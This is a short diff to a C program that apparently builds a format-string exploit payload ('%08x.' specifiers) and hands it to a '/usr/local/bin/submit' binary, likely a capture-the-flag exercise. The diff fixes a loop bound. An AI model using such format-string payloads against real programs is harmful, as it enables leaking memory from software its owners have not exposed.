@@ -23,7 +23,7 @@ int main(){
 			"%08x.%08x.";
 	char* cmd = (char*)malloc(1000);
 	p_cmd_len = strlen(p_cmd);
-	for(i =p_cmd_len;i<;i++){
+	for(i =p_cmd_len;i<999;i++){
 		cmd[i] = 'a';
 	}
 	snprintf(cmd, 1000, "/usr/local/bin/submit %s", p_cmd);
